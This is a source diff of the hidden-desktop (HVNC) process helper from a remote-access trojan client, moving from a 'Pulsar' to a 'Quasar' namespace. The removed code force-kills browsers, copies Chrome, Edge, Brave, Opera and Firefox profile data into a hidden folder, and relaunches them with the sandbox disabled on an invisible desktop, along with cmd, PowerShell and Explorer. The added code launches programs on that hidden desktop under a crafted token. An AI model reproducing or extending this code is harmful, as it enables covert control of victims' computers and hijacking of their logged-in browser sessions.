@@ -1,356 +1,144 @@
-﻿using Microsoft.Win32;
 using System;
-using System.Collections.Concurrent;
-using System.Diagnostics;
+using System.Collections.Generic;
 using System.IO;
+using System.Linq;
 using System.Runtime.InteropServices;
+using System.Text;
 using System.Threading.Tasks;
 
-namespace Pulsar.Client.Helper.HVNC
+namespace Quasar.Client.Helper.HVNC
 {
-    public class ProcessController
+    public class ProcessHelper
     {
-        public ProcessController(string DesktopName)
+        public static bool RunAsRestrictedUser(string fileName, string DesktopName)
         {
-            this.DesktopName = DesktopName;
-        }
-
-        [DllImport("kernel32.dll")]
-        private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, int dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, ref PROCESS_INFORMATION lpProcessInformation);
-
-        private void CloneDirectory(string sourceDir, string destinationDir)
-        {
-            if (!Directory.Exists(sourceDir))
+            if (string.IsNullOrWhiteSpace(fileName))
             {
-                throw new DirectoryNotFoundException($"Source directory '{sourceDir}' not found.");
+                throw new ArgumentException("Value cannot be null or whitespace.", "fileName");
             }
-
-            Directory.CreateDirectory(destinationDir);
-
-            var directories = Directory.GetDirectories(sourceDir, "*", SearchOption.AllDirectories);
-            var files = Directory.GetFiles(sourceDir, "*", SearchOption.AllDirectories);
-
-            Parallel.ForEach(directories, dir =>
+            IntPtr intPtr;
+            if (!GetRestrictedSessionUserToken(out intPtr))
             {
-                try
-                {
-                    string targetDir = dir.Replace(sourceDir, destinationDir);
-                    Directory.CreateDirectory(targetDir);
-                }
-                catch (Exception) { }
-            });
-
-            Parallel.ForEach(files, file =>
-            {
-                try
-                {
-                    string targetFile = file.Replace(sourceDir, destinationDir);
-                    File.Copy(file, targetFile, true);
-                }
-                catch (UnauthorizedAccessException) { }
-                catch (IOException) { }
-                catch (Exception) { }
-            });
-        }
-
-        private static bool DeleteFolder(string folderPath)
-        {
+                return false;
+            }
             bool result;
             try
             {
-                if (Directory.Exists(folderPath))
+                STARTUPINFO structure = default(STARTUPINFO);
+                structure.cb = Marshal.SizeOf<STARTUPINFO>(structure);
+                structure.lpDesktop = DesktopName;
+                PROCESS_INFORMATION process_INFORMATION = default(PROCESS_INFORMATION);
+                StringBuilder stringBuilder = new StringBuilder();
+                stringBuilder.Append(fileName);
+                if (!CreateProcessAsUser(intPtr, null, stringBuilder, IntPtr.Zero, IntPtr.Zero, true, 0U, IntPtr.Zero, Path.GetDirectoryName(fileName), ref structure, out process_INFORMATION))
                 {
-                    Directory.Delete(folderPath, true);
-                    result = true;
+                    result = false;
                 }
                 else
                 {
-                    Debug.WriteLine("Folder does not exist.");
-                    result = false;
+                    result = true;
                 }
             }
-            catch (Exception ex)
+            finally
             {
-                Debug.WriteLine("Error deleting folder: " + ex.Message);
-                result = false;
+                CloseHandle(intPtr);
             }
             return result;
         }
 
-        public void StartCmd()
+        private static bool GetRestrictedSessionUserToken(out IntPtr token)
         {
-            string path = "conhost cmd.exe";
-            this.CreateProc(path);
-        }
-
-        public void StartPowershell()
-        {
-            string path = "conhost powershell.exe";
-            this.CreateProc(path);
-        }
-
-        public void StartGeneric(string path)
-        {
-            string command = "conhost " + path;
-            this.CreateProc(command);
-        }
-
-        public void StartFirefox()
-        {
-            string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Mozilla\\Firefox\\";
-            if (!Directory.Exists(path)) return;
-
-            string sourceDir = Path.Combine(path, "Profiles");
-            if (!Directory.Exists(sourceDir)) return;
-
-            string secureFolder = Path.Combine(path, "SecureFolder");
-            string killCommand = "Conhost --headless cmd.exe /c taskkill /IM firefox.exe /F";
-
-            bool needsClone = false;
-
-            if (!Directory.Exists(secureFolder))
+            token = IntPtr.Zero;
+            IntPtr intPtr;
+            if (!SaferCreateLevel(SaferScope.User, SaferLevel.NormalUser, SaferOpenFlags.Open, out intPtr, IntPtr.Zero))
             {
-                this.CreateProc(killCommand);
-                Directory.CreateDirectory(secureFolder);
-                needsClone = true;
+                return false;
             }
-            else
+            IntPtr zero = IntPtr.Zero;
+            TOKEN_MANDATORY_LABEL token_MANDATORY_LABEL = default(TOKEN_MANDATORY_LABEL);
+            token_MANDATORY_LABEL.Label.Sid = IntPtr.Zero;
+            IntPtr intPtr2 = IntPtr.Zero;
+            try
             {
-                DeleteFolder(secureFolder);
-                Directory.CreateDirectory(secureFolder);
-                needsClone = true;
-            }
-
-            if (needsClone)
-            {
-                try
+                if (!SaferComputeTokenFromLevel(intPtr, IntPtr.Zero, out zero, 0, IntPtr.Zero))
                 {
-                    this.CloneDirectory(sourceDir, secureFolder);
+                    return false;
                 }
-                catch (Exception ex)
+                token_MANDATORY_LABEL.Label.Attributes = 32U;
+                token_MANDATORY_LABEL.Label.Sid = IntPtr.Zero;
+                if (!ConvertStringSidToSid("S-1-16-8192", out token_MANDATORY_LABEL.Label.Sid))
                 {
-                    Debug.WriteLine("Failed to clone Firefox profile: " + ex.Message);
+                    return false;
+                }
+                intPtr2 = Marshal.AllocHGlobal(Marshal.SizeOf<TOKEN_MANDATORY_LABEL>(token_MANDATORY_LABEL));
+                Marshal.StructureToPtr<TOKEN_MANDATORY_LABEL>(token_MANDATORY_LABEL, intPtr2, false);
+                if (!SetTokenInformation(zero, TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, intPtr2, (uint)Marshal.SizeOf<TOKEN_MANDATORY_LABEL>(token_MANDATORY_LABEL)))
+                {
+                    return false;
+                }
+                token = zero;
+                zero = IntPtr.Zero;
+            }
+            finally
+            {
+                SaferCloseLevel(intPtr);
+                SafeCloseHandle(zero);
+                if (token_MANDATORY_LABEL.Label.Sid != IntPtr.Zero)
+                {
+                    LocalFree(token_MANDATORY_LABEL.Label.Sid);
+                }
+                if (intPtr2 != IntPtr.Zero)
+                {
+                    Marshal.FreeHGlobal(intPtr2);
                 }
             }
-
-            string startCommand = "Conhost --headless cmd.exe /c start firefox -new-window -safe-mode -no-remote -profile \"" + secureFolder + "\"";
-            this.CreateProc(startCommand);
+            return true;
         }
 
-        public void StartBrave()
+        [DllImport("advapi32", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
+        private static extern bool SaferCreateLevel(SaferScope scope, SaferLevel level, SaferOpenFlags openFlags, out IntPtr pLevelHandle, IntPtr lpReserved);
+
+        [DllImport("advapi32", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
+        private static extern bool SaferComputeTokenFromLevel(IntPtr LevelHandle, IntPtr InAccessToken, out IntPtr OutAccessToken, int dwFlags, IntPtr lpReserved);
+
+        [DllImport("advapi32", SetLastError = true)]
+        private static extern bool SaferCloseLevel(IntPtr hLevelHandle);
+
+        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+        private static extern bool ConvertStringSidToSid(string StringSid, out IntPtr ptrSid);
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        private static extern bool CloseHandle(IntPtr hObject);
+
+        private static bool SafeCloseHandle(IntPtr hObject)
         {
-            string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\BraveSoftware\\Brave-Browser\\";
-            if (!Directory.Exists(path)) return;
-
-            string sourceDir = Path.Combine(path, "User Data");
-            if (!Directory.Exists(sourceDir)) return;
-
-            string secureFolder = Path.Combine(path, "SecureFolder");
-            string killCommand = "Conhost --headless cmd.exe /c taskkill /IM brave.exe /F";
-
-            bool needsClone = false;
-
-            if (!Directory.Exists(secureFolder))
-            {
-                this.CreateProc(killCommand);
-                Directory.CreateDirectory(secureFolder);
-                needsClone = true;
-            }
-            else
-            {
-
-                DeleteFolder(secureFolder);
-                Directory.CreateDirectory(secureFolder);
-                needsClone = true;
-            }
-
-            if (needsClone)
-            {
-                try
-                {
-                    this.CloneDirectory(sourceDir, secureFolder);
-                }
-                catch (Exception ex)
-                {
-                    Debug.WriteLine("Failed to clone Brave profile: " + ex.Message);
-                }
-            }
-
-            string startCommand = "Conhost --headless cmd.exe /c start brave.exe --start-maximized --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --user-data-dir=" + secureFolder;
-            this.CreateProc(startCommand);
+            return hObject == IntPtr.Zero || CloseHandle(hObject);
         }
 
-        public void StartOpera()
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern IntPtr LocalFree(IntPtr hMem);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        private static extern bool SetTokenInformation(IntPtr TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, IntPtr TokenInformation, uint TokenInformationLength);
+
+        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+        private static extern bool CreateProcessAsUser(IntPtr hToken, string lpApplicationName, StringBuilder lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+
+        private const uint SE_GROUP_INTEGRITY = 32U;
+
+        private struct PROCESS_INFORMATION
         {
-            string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\";
-            if (!Directory.Exists(path)) return;
+            public IntPtr hProcess;
 
-            string sourceDir = path;
-            string secureFolder = Path.Combine(Path.GetDirectoryName(path), "SecureFolder");
-            string killCommand = "Conhost --headless cmd.exe /c taskkill /IM opera.exe /F";
+            public IntPtr hThread;
 
-            bool needsClone = false;
+            public int dwProcessId;
 
-            if (!Directory.Exists(secureFolder))
-            {
-                this.CreateProc(killCommand);
-                Directory.CreateDirectory(secureFolder);
-                needsClone = true;
-            }
-            else
-            {
-                DeleteFolder(secureFolder);
-                Directory.CreateDirectory(secureFolder);
-                needsClone = true;
-            }
-
-            if (needsClone)
-            {
-                try
-                {
-                    this.CloneDirectory(sourceDir, secureFolder);
-                }
-                catch (Exception ex)
-                {
-                    Debug.WriteLine("Failed to clone Opera profile: " + ex.Message);
-                }
-            }
-
-            string startCommand = "Conhost --headless cmd.exe /c start opera.exe --user-data-dir=\"" + secureFolder + "\"";
-            this.CreateProc(startCommand);
+            public int dwThreadId;
         }
 
-        public void StartEdge()
-        {
-            string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Edge\\";
-
-            if (!Directory.Exists(path))
-            {
-                return;
-            }
-
-            string sourceDir = Path.Combine(path, "User Data");
-
-            if (!Directory.Exists(sourceDir))
-            {
-                return;
-            }
-
-            string text = Path.Combine(path, "SecureFolder");
-            string filePath = "Conhost --headless cmd.exe /c taskkill /IM msedge.exe /F";
-            if (!Directory.Exists(text))
-            {
-                this.CreateProc(filePath);
-                Directory.CreateDirectory(text);
-                this.CloneDirectory(sourceDir, text);
-            }
-            else
-            {
-                DeleteFolder(text);
-                this.StartEdge();
-            }
-            string filePath2 = "Conhost --headless cmd.exe /c start msedge.exe --start-maximized --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --user-data-dir=" + text;
-            this.CreateProc(filePath2);
-        }
-
-        public void Startchrome()
-        {
-            string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\";
-            if (!Directory.Exists(path)) return;
-
-            string sourceDir = Path.Combine(path, "User Data");
-            if (!Directory.Exists(sourceDir)) return;
-
-            string secureFolder = Path.Combine(path, "SecureFolder");
-            string killCommand = "Conhost --headless cmd.exe /c taskkill /IM chrome.exe /F";
-
-            bool needsClone = false;
-
-            if (!Directory.Exists(secureFolder))
-            {
-                this.CreateProc(killCommand);
-                Directory.CreateDirectory(secureFolder);
-                needsClone = true;
-            }
-            else
-            {
-                DeleteFolder(secureFolder);
-                Directory.CreateDirectory(secureFolder);
-                needsClone = true;
-            }
-
-            if (needsClone)
-            {
-                try
-                {
-                    this.CloneDirectory(sourceDir, secureFolder);
-                }
-                catch (Exception ex)
-                {
-                    Debug.WriteLine("Failed to clone Chrome profile: " + ex.Message);
-                }
-            }
-
-            string startCommand = "Conhost --headless cmd.exe /c start chrome.exe --start-maximized --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --user-data-dir=" + secureFolder;
-            this.CreateProc(startCommand);
-        }
-
-        public void StartDiscord()
-        {
-            string discordPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Discord\\Update.exe";
-            if (!File.Exists(discordPath)) return;
-
-            string killCommand = "Conhost --headless cmd.exe /c taskkill /IM discord.exe /F";
-            this.CreateProc(killCommand);
-
-            string startCommand = "\"" + discordPath + "\" --processStart Discord.exe";
-            this.CreateProc(startCommand);
-        }
-
-        public void StartExplorer()
-        {
-            uint num = 2U;
-            string name = "TaskbarGlomLevel";
-            string name2 = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced";
-            using (RegistryKey registryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(name2, true))
-            {
-                if (registryKey != null)
-                {
-                    object value = registryKey.GetValue(name);
-                    if (value is uint)
-                    {
-                        uint num2 = (uint)value;
-                        if (num2 != num)
-                        {
-                            registryKey.SetValue(name, num, RegistryValueKind.DWord);
-                        }
-                    }
-                }
-            }
-            string explorerPath = Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\explorer.exe /NoUACCheck";
-            this.CreateProc(explorerPath);
-        }
-
-        public bool CloseProc(string filePath)
-        {
-            STARTUPINFO structure = default(STARTUPINFO);
-            structure.cb = Marshal.SizeOf<STARTUPINFO>(structure);
-            structure.lpDesktop = this.DesktopName;
-            PROCESS_INFORMATION process_INFORMATION = default(PROCESS_INFORMATION);
-            return CreateProcess(null, filePath, IntPtr.Zero, IntPtr.Zero, false, 48, IntPtr.Zero, null, ref structure, ref process_INFORMATION);
-        }
-
-        public bool CreateProc(string filePath)
-        {
-            STARTUPINFO structure = default(STARTUPINFO);
-            structure.cb = Marshal.SizeOf<STARTUPINFO>(structure);
-            structure.lpDesktop = this.DesktopName;
-            PROCESS_INFORMATION process_INFORMATION = default(PROCESS_INFORMATION);
-            return CreateProcess(null, filePath, IntPtr.Zero, IntPtr.Zero, false, 48, IntPtr.Zero, null, ref structure, ref process_INFORMATION);
-        }
-
-        private string DesktopName;
-
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
         private struct STARTUPINFO
         {
             public int cb;
@@ -386,19 +174,73 @@ namespace Pulsar.Client.Helper.HVNC
             public IntPtr hStdInput;
 
             public IntPtr hStdOutput;
-
             public IntPtr hStdError;
         }
 
-        internal struct PROCESS_INFORMATION
+        private struct SID_AND_ATTRIBUTES
         {
-            public IntPtr hProcess;
+            public IntPtr Sid;
 
-            public IntPtr hThread;
+            public uint Attributes;
+        }
 
-            public int dwProcessId;
+        private struct TOKEN_MANDATORY_LABEL
+        {
+            public SID_AND_ATTRIBUTES Label;
+        }
 
-            public int dwThreadId;
+        public enum SaferLevel : uint
+        {
+            Disallowed,
+            Untrusted = 4096U,
+            Constrained = 65536U,
+            NormalUser = 131072U,
+            FullyTrusted = 262144U
+        }
+
+        public enum SaferScope : uint
+        {
+            Machine = 1U,
+            User
+        }
+
+        [Flags]
+        public enum SaferOpenFlags : uint
+        {
+            Open = 1U
+        }
+
+        private enum TOKEN_INFORMATION_CLASS
+        {
+            TokenUser = 1,
+            TokenGroups,
+            TokenPrivileges,
+            TokenOwner,
+            TokenPrimaryGroup,
+            TokenDefaultDacl,
+            TokenSource,
+            TokenType,
+            TokenImpersonationLevel,
+            TokenStatistics,
+            TokenRestrictedSids,
+            TokenSessionId,
+            TokenGroupsAndPrivileges,
+            TokenSessionReference,
+            TokenSandBoxInert,
+            TokenAuditPolicy,
+            TokenOrigin,
+            TokenElevationType,
+            TokenLinkedToken,
+            TokenElevation,
+            TokenHasRestrictions,
+            TokenAccessInformation,
+            TokenVirtualizationAllowed,
+            TokenVirtualizationEnabled,
+            TokenIntegrityLevel,
+            TokenUIAccess,
+            TokenMandatoryPolicy,
+            TokenLogonSid,
+            MaxTokenInfoClass
         }
     }
 }
